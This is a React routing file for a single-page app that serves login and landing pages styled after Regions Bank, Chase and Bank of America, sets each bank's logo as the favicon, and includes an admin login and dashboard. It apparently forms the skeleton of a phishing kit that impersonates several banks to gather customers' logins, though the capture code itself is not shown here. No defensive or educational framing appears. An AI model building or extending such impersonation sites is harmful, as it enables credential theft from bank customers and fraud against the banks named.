import { BrowserRouter, Routes, Route, Navigate, useLocation, useNavigate } from 'react-router-dom'
import { useState, useEffect } from 'react'

// Regions Bank
import RegionsLogin from './pages/Login'
import RegionsLanding from './pages/Landing'

// Chase Bank
import ChaseLogin from './pages/ChaseLogin'
import ChaseLanding from './pages/ChaseLanding'

// Bank of America
import BankOfAmericaLogin from './pages/BankOfAmericaLogin'
import BankOfAmericaLanding from './pages/BankOfAmericaLanding'

// Admin
import AdminLogin from './pages/AdminLogin'
import AdminDashboard from './pages/AdminDashboard'

function AppContent() {
  const location = useLocation()
  const navigate = useNavigate()
  const [isAuthenticated, setIsAuthenticated] = useState(false)
  const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
  const [loading, setLoading] = useState(true)

  // Update favicon based on current route - run after render to avoid interfering with routing
  useEffect(() => {
    // Use requestAnimationFrame to ensure this runs after React has finished rendering
    const updateFavicon = () => {
      let faviconPath = '/regions-logo.svg' // default
      const path = location.pathname

      if (path.includes('/chase-bank')) {
        faviconPath = '/chase-logo.svg'
      } else if (path.includes('/bank-of-america')) {
        faviconPath = '/bofa-logo.svg'
      } else if (path.includes('/admin')) {
        faviconPath = '/regions-logo.svg'
      } else if (path.includes('/region-bank') || path === '/') {
        faviconPath = '/regions-logo.svg'
      }

      // Update favicon - find or create the favicon link
      const head = document.getElementsByTagName('head')[0]
      if (!head) return
      
      let link = head.querySelector("link[rel='icon']") || 
                 head.querySelector("link[rel*='icon']") ||
                 head.querySelector("link[rel='shortcut icon']")
      
      if (!link) {
        link = document.createElement('link')
        link.rel = 'icon'
        link.type = 'image/svg+xml'
        head.appendChild(link)
      }
      
      // Only update if different
      const fullPath = window.location.origin + faviconPath
      if (link.href !== fullPath) {
        link.href = faviconPath
      }
    }

    // Use requestAnimationFrame to run after render
    const rafId = requestAnimationFrame(() => {
      updateFavicon()
    })
    
    return () => {
      cancelAnimationFrame(rafId)
    }
  }, [location.pathname])

  useEffect(() => {
    // Handle GitHub Pages 404.html redirect (only once on mount)
    // Only process if we have a query string that looks like a 404 redirect from 404.html
    // The 404.html redirects to /?/path, so we look for ?/ in the query string
    const search = window.location.search
    if (search && search.startsWith('?/')) {
      const path = search.slice(1) // Remove the '?'
      if (path && path.startsWith('/')) {
        const pathParts = path.split('&')
        const newPath = pathParts[0].replace(/~and~/g, '&')
        const newSearch = pathParts.slice(1).join('&').replace(/~and~/g, '&')
        // Use React Router's navigate to properly handle the redirect
        const newUrl = newPath + (newSearch ? '?' + newSearch : '') + window.location.hash
        navigate(newUrl, { replace: true })
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []) // Only run once on mount

  useEffect(() => {
    const checkAuth = () => {
      const auth = localStorage.getItem('isAuthenticated')
      const userEmail = localStorage.getItem('userEmail')
      setIsAuthenticated(auth === 'true' && !!userEmail)
      
      const adminAuth = localStorage.getItem('isAdminAuthenticated')
      setIsAdminAuthenticated(adminAuth === 'true')
      
      setLoading(false)
    }

    checkAuth()

    // Listen for storage changes (for logout from other tabs/windows)
    const handleStorageChange = () => {
      checkAuth()
    }

    window.addEventListener('storage', handleStorageChange)
    
    return () => {
      window.removeEventListener('storage', handleStorageChange)
    }
  }, [])

  // Don't show loading screen - let routes render immediately
  // if (loading) {
  //   return <div>Loading...</div>
  // }

  return (
    <Routes>
        {/* Admin Routes - Put first to ensure they match before other routes */}
        <Route 
          path="/admin/login" 
          element={
            isAdminAuthenticated ? <Navigate to="/admin" replace /> : <AdminLogin setIsAdminAuthenticated={setIsAdminAuthenticated} />
          } 
        />
        <Route 
          path="/admin" 
          element={
            isAdminAuthenticated ? <AdminDashboard /> : <Navigate to="/admin/login" replace />
          } 
        />

        {/* Regions Bank Routes */}
        <Route 
          path="/region-bank/login" 
          element={
            isAuthenticated ? <Navigate to="/region-bank" replace /> : <RegionsLogin setIsAuthenticated={setIsAuthenticated} />
          } 
        />
        <Route 
          path="/region-bank" 
          element={
            isAuthenticated ? <RegionsLanding /> : <Navigate to="/region-bank/login" replace />
          } 
        />

        {/* Chase Bank Routes */}
        <Route 
          path="/chase-bank/login" 
          element={
            isAuthenticated ? <Navigate to="/chase-bank" replace /> : <ChaseLogin setIsAuthenticated={setIsAuthenticated} />
          } 
        />
        <Route 
          path="/chase-bank" 
          element={
            isAuthenticated ? <ChaseLanding /> : <Navigate to="/chase-bank/login" replace />
          } 
        />

        {/* Bank of America Routes */}
        <Route 
          path="/bank-of-america/login" 
          element={
            isAuthenticated ? <Navigate to="/bank-of-america" replace /> : <BankOfAmericaLogin setIsAuthenticated={setIsAuthenticated} />
          } 
        />
        <Route 
          path="/bank-of-america" 
          element={
            isAuthenticated ? <BankOfAmericaLanding /> : <Navigate to="/bank-of-america/login" replace />
          } 
        />

        {/* Default redirect - Must be last */}
        <Route path="/" element={<Navigate to="/region-bank/login" replace />} />
      </Routes>
  )
}

function App() {
  return (
    <BrowserRouter>
      <AppContent />
    </BrowserRouter>
  )
}

export default App
